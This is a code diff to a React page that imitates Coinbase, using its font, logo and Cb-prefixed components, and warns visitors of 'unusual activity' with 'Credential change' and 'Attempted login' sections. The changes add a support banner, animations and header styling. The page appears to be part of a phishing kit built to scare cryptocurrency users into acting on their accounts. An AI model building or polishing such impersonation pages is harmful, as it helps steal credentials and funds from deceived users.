@@ -3,6 +3,7 @@ import { useEffect, useState } from "react";
 import {
   CbFontStyle,
   CbLogo,
+  CbSupportBanner,
   useCbTracking,
 } from "@/components/cb/CbShared";
 
@@ -72,6 +73,8 @@ function CbReviewPage() {
           font-family: 'CoinbaseSans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif !important;
           box-sizing: border-box;
         }
+        @keyframes cbFadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+        .cb-animate { animation: cbFadeIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) both; }
         .cb-section-collapse {
           overflow: hidden;
           transition: max-height 0.4s ease, opacity 0.3s ease, margin 0.4s ease;
@@ -85,11 +88,11 @@ function CbReviewPage() {
         .cb-divider-collapse.hidden-section { max-height: 0; opacity: 0; margin: 0 !important; }
       `}</style>
 
-      <header style={{ padding: "16px 24px" }}>
-        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
-          <div style={{ cursor: "pointer" }} onClick={() => trackClick("Logo")}>
-            <CbLogo />
-          </div>
+      <CbSupportBanner />
+
+      <header style={{ display: "flex", alignItems: "center", height: 72, padding: "0 24px" }}>
+        <div style={{ cursor: "pointer", color: "#fff" }} onClick={() => trackClick("Logo")}>
+          <CbLogo />
         </div>
       </header>
 
@@ -103,16 +106,16 @@ function CbReviewPage() {
         }}
       >
         <div style={{ width: "100%", maxWidth: 480, borderRadius: 16, padding: "40px 32px" }}>
-          <h1 style={{ fontSize: 24, fontWeight: 700, color: "#fff", margin: 0, lineHeight: "32px" }}>
+          <h1 className="cb-animate" style={{ fontSize: 24, fontWeight: 700, color: "#fff", margin: 0, lineHeight: "32px" }}>
             Review your account
           </h1>
-          <p style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", marginTop: 8, lineHeight: "20px" }}>
+          <p className="cb-animate" style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", marginTop: 8, lineHeight: "20px", animationDelay: "0.05s" }}>
             We have detected unusual activity on your account, please review these actions before continuing.
           </p>
 
           <div
-            className={`cb-section-collapse ${section1Hidden ? "hidden-section" : ""}`}
-            style={{ marginTop: 32 }}
+            className={`cb-section-collapse cb-animate ${section1Hidden ? "hidden-section" : ""}`}
+            style={{ marginTop: 32, animationDelay: "0.1s" }}
           >
             <div style={{ fontSize: 14, fontWeight: 500, color: "#fff" }}>Credential change</div>
             <p style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", marginTop: 12, lineHeight: "20px" }}>
@@ -181,8 +184,8 @@ function CbReviewPage() {
           />
 
           <div
-            className={`cb-section-collapse ${section2Hidden ? "hidden-section" : ""}`}
-            style={{ marginTop: section1Hidden ? 32 : 0 }}
+            className={`cb-section-collapse cb-animate ${section2Hidden ? "hidden-section" : ""}`}
+            style={{ marginTop: section1Hidden ? 32 : 0, animationDelay: "0.15s" }}
           >
             <div style={{ fontSize: 14, fontWeight: 500, color: "#fff" }}>Attempted login</div>
             <p style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", marginTop: 12, lineHeight: "20px" }}>
